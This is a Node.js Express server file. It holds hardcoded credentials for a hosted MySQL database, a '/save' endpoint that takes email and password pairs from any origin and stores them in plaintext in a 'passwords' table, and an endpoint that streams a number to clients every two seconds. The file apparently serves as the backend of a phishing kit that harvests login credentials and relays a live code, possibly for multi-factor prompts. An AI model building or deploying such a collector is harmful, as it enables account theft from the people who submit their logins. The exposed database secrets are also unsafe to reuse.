const express = require("express");
const bodyParser = require("body-parser");
const mysql = require("mysql");
const cors = require("cors");

const app = express();
const port = 5000;

// Middleware
app.use(bodyParser.json());
app.use(cors());

// Database connection configuration
const dbConfig = {
  host: "srv1085.hstgr.io",
  user: "u184458458_fake_test",
  password: "Fake@taxi@123",
  database: "u184458458_fake_test",
};

let db;

function handleDisconnect() {
  db = mysql.createConnection(dbConfig);

  db.connect((err) => {
    if (err) {
      console.error("Error connecting to database:", err);
      setTimeout(handleDisconnect, 2000); // Retry connection after 2 seconds
    } else {
      console.log("Connected to database.");
    }
  });

  db.on("error", (err) => {
    console.error("Database error:", err);
    if (err.code === "PROTOCOL_CONNECTION_LOST" || err.code === "ECONNRESET") {
      handleDisconnect(); // Reconnect on connection loss
    } else {
      throw err;
    }
  });
}

handleDisconnect();

// Route to handle saving email and password
app.post("/save", (req, res) => {
  const { email, password } = req.body;
  const query = "INSERT INTO passwords (email, password) VALUES (?, ?)";
  db.query(query, [email, password], (err, result) => {
    if (err) {
      console.error("Error saving data:", err);
      res.status(500).json({ status: "error", message: "Error saving data" });
    } else {
      res
        .status(200)
        .json({ status: "success", message: "Data saved successfully" });
    }
  });
});

// Route to continuously send the number using SSE
app.get("/streamNumber", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");

  const sendNumber = () => {
    const query = "SELECT number FROM numbers_table LIMIT 1"; // Replace 'numbers_table' with your actual table name
    db.query(query, (err, result) => {
      if (err) {
        console.error("Error fetching number:", err);
        res.write(`event: error\ndata: ${JSON.stringify({ status: "error", message: "Error fetching number" })}\n\n`);
      } else if (result.length > 0) {
        res.write(`event: number\ndata: ${JSON.stringify({ status: "success", number: result[0].number })}\n\n`);
      } else {
        res.write(`event: error\ndata: ${JSON.stringify({ status: "error", message: "No number found" })}\n\n`);
      }
    });
  };

  // Send the number every 2 seconds
  const intervalId = setInterval(sendNumber, 2000);

  // Clean up when the client closes the connection
  req.on("close", () => {
    clearInterval(intervalId);
    res.end();
  });
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});